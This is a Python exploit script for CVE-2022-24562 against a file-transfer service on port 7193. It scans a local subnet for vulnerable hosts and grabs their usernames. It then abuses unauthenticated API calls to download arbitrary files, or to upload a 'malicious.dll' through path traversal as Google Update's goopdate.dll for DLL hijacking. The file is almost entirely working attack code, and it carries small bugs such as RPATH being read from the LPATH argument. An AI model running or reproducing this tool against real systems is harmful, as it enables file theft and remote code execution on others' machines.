import os
from urllib3.exceptions import ConnectTimeoutError
from win32com.client import *
import requests
import json
import argparse,textwrap

localDownloadPath ="out.pdf"
localPayloadPath = r"c:\temp\malicious.dll"
remotePayloadPath = "../Program Files (x86)/Google/Update/goopdate.dll"
remoteDownloadPath = r'C:\Users\User\Desktop\obligationservlet.pdf'
Range = "192.168.89"
UpOrDown = "Upload"
IP = ""
UserName = ""
Banner = '''
   _______      ________    ___   ___ ___  ___      ___  _  _   _____   __ ___  
  / ____\ \    / /  ____|  |__ \ / _ \__ \|__ \    |__ \| || | | ____| / /|__ \ 
 | |     \ \  / /| |__ ______ ) | | | | ) |  ) |_____ ) | || |_| |__  / /_   ) |
 | |      \ \/ / |  __|______/ /| | | |/ /  / /______/ /|__   _|___ \| '_ \ / / 
 | |____   \  /  | |____    / /_| |_| / /_ / /_     / /_   | |  ___) | (_) / /_ 
  \_____|   \/   |______|  |____|\___/____|____|   |____|  |_| |____/ \___/____|
  '''
help = '''
localPayloadPath - path to the payload on the local endpoint
remotePayloadPath - Upload location on remote machine
remoteDownloadPath - path to the file you want to download from the reomte machine
Range - IP range to scan for a vulnerable machine
UpOrDown - Upload or Download a file
'''

def get_version_number(file_path):
    information_parser = Dispatch("Scripting.FileSystemObject")
    version = information_parser.GetFileVersion(file_path)
    return version


def getTaskList(IP, taskid=""):
    print("Getting task list...")
    url = f'http://{IP}:7193/index.php?action=gettasklist&userid=*'
    res = requests.get(url)
    tasks = json.loads(res.content)
    tasks = json.loads(tasks['content'])
    for task in tasks['tasks']:
        if taskid == task['taskid']:
            print(f"Task ID found: {taskid}")


def CreateUploadTask(IP):
    SetSavePath(IP)
    url = f'http://{IP}:7193/index.php?action=createtask'
    task = {
        'method': 'get',
        'version': '1',
        'userid': '*',
        'taskstate': '0',
    }
    res = requests.post(url, json=task)
    task = json.loads(res.content)
    task = json.loads(task['content'])
    taskid = task['taskid']
    print(f"[*] TaskID: {taskid}")
    return taskid


def CreateUploadDetailNode(IP, taskid, remotePath, size='100'):
    url = f'http://{IP}:7193/index.php?action=settaskdetailbyindex&userid=*&taskid={taskid}&index=0'
    file_info = {
        'size': size,
        'savefilename': remotePath,
        'name': remotePath,
        'fullpath': r'c:\windows\system32\calc.exe',
        'md5': 'md5md5md5md5md5',
        'filetype': '3',
    }
    res = requests.post(url, json=file_info)
    js = json.loads(res.content)
    print(f"[V] Create Detail returned: {js['code']}")


def readFile(Path):
    file = open(Path, "rb")
    byte = file.read(1)
    next = "Start"
    while next != b'':
        byte = byte + file.read(1023)
        next = file.read(1)
        if next != b'':
            byte = byte + next
    file.close()
    return byte


def CallUpload(IP, taskid, localPayloadPath):
    url = f'http://{IP}:7193/index.php?action=newuploadfile&userid=*&taskid={taskid}&index=0'
    send_data = readFile(localPayloadPath)
    try:
        res = requests.post(url, data=send_data)
        js = json.loads(res.content)
        if js['code'] == 200:
            print("[V] Success payload uploaded!")
        else:
            print(f"CreateRemoteFile: {res.content}")
    except:
        print("[*] Reusing the task...")
        res = requests.post(url, data=send_data)
        js = json.loads(res.content)
        if js['code'] == 200 or "false" in js['error']:
            print("[V] Success payload uploaded!")
        else:
            print(f"[X] CreateRemoteFile Failed: {res.content}")


def SetSavePath(IP):
    url = f'http://{IP}:7193/index.php?action=setiotconfig'
    config = {
        'tasksavepath': 'C:\\Program '
    }
    requests.post(url, json=config)


def ExploitUpload(IP, payloadPath, rPath, taskid=None):
    if not taskid:
        taskid = CreateUploadTask(IP)
        size = os.path.getsize(payloadPath)
    CreateUploadDetailNode(IP, taskid, remotePath=rPath, size=str(size))
    CallUpload(IP, taskid, payloadPath)


def CreateDownloadTask(IP, Path) -> str:
    url = f'http://{IP}:7193/index.php?action=createtask'
    task = {
        'method': 'get',
        'version': '1',
        'userid': '*',
        'taskstate': '0',
        'filepath': Path
    }
    res = requests.post(url, json=task)
    task = json.loads(res.content)
    task = json.loads(task['content'])
    taskid = task['taskid']
    print(f"TaskID: {taskid}")
    return taskid


def ExploitDownload(IP, DownloadPath, ID=None):
    if ID:
        url = f'http://{IP}:7193/index.php?action=downloadfile&userid=*&taskid={ID}'
    else:
        taskid = CreateDownloadTask(IP, DownloadPath)
        url = f'http://{IP}:7193/index.php?action=downloadfile&userid=*&taskid={taskid}'
    res = requests.get(url)
    return res


def ScanIP(startRange):
    print("[*] Searching for vulnerable IPs", end='')
    Current = 142
    IP = f"{startRange}.{Current}"
    VulnerableIP: str = ""
    UserName: str = ""
    while Current < 252:
        print(".", end='')
        url = f'http://{IP}:7193/index.php?action=getpcname&userid=*'
        try:
            res = requests.get(url, timeout=1)
            js = json.loads(res.content)
            js2 = json.loads(js['content'])
            UserName = js2['name']
            VulnerableIP = IP
            print(f"\n[V] Found a Vulnerable IP: {VulnerableIP}")
            print(f"[!] Vulnerable PC username: {UserName}")
            return VulnerableIP, UserName
        except Exception as e:
            pass
        except ConnectTimeoutError:
            pass
        IP = f"{startRange}.{Current}"
        Current = Current + 1
    return None, None

def PrintDefaults():
    global UpOrDown, localPayloadPath, localDownloadPath, remotePayloadPath, remoteDownloadPath,Range
    print(f"Range: {Range}")
    print(f'Mode: {UpOrDown}')
    print(f"Local Payload Path: {localPayloadPath}")
    print(f"Remote Path: {remotePayloadPath}")
    print(f"Local Download Path: {localDownloadPath}")
def ParseArguments():
    global UpOrDown,localPayloadPath,localDownloadPath,remotePayloadPath,remoteDownloadPath,Range
    my_parser = argparse.ArgumentParser(description='CVE-2022-24562 implementation',usage='%(prog)s [options]',formatter_class=argparse.RawTextHelpFormatter)
    my_parser.add_argument('-r',
                           '--range',
                           type=str,
                           help='Enter the ip range to scan')
    my_parser.add_argument('-d',
                           '--default',
                           action='store_true',
                           help='prints the default values for the arguments')
    my_parser.add_argument('-m',
                           '--mode',
                           type=str,
                           help='Choose wanted mode [Upload/Download]')
    my_parser.add_argument('--LPATH',
                           type=str,
                           help=textwrap.dedent('''Choose Local Path:\r\nDownload Mode - Save location for the file\r\nUpload Mode - Local payload location'''))
    my_parser.add_argument('--RPATH',
                           type=str,
                           help=textwrap.dedent('''Choose Local Path:\r\nDownload Mode - Remote file to download\r\nUpload Mode - Uploaded payload save location'''))
    args = my_parser.parse_args()
    list_args = vars(args)
    if list_args['default']:
        PrintDefaults()
        exit()
    if list_args['mode'] is not None:
        if list_args['mode'] != 'Download' and list_args['mode'] != 'Upload':
            print('Mode: Upload')
        else:
            UpOrDown = list_args['mode']
    if list_args['range'] is not None:
        Range = list_args['range']
    if list_args['LPATH'] is not None and UpOrDown == "Download":
        localDownloadPath = list_args['LPATH']
    if list_args['LPATH'] is not None and UpOrDown == "Upload":
        localPayloadPath = list_args['LPATH']
    if list_args['RPATH'] is not None and UpOrDown == "Download":
        remoteDownloadPath = list_args['LPATH']
    if list_args['RPATH'] is not None and UpOrDown == "Upload":
        remotePayloadPath = list_args['LPATH']
if __name__ == '__main__':
    print(Banner)
    ParseArguments()
    print(f"Range: {Range}")
    print(f'Mode: {UpOrDown}')
    IP, UserName = ScanIP(Range)
    if IP is None or UserName is None:
        print("[X] No vulnerable IP found")
        exit()
    print(f"Vulnerable IP: {IP}")
    print(f'User Name: {UserName}')
    print("[*] Starting Exploit...")
    if UpOrDown == "Upload":
        print(f"[*]Local Payload Path: {localPayloadPath}")
        print(f"[*]Remote Upload Path: {remotePayloadPath}")
        ExploitUpload(IP, localPayloadPath, remotePayloadPath)
    elif UpOrDown == "Download":
        print(f"[*] Downloading the file: {remoteDownloadPath}")
        res = ExploitDownload(IP, remoteDownloadPath)
        file = open(localDownloadPath, "wb+")
        file.write(res.content)
        file.close()
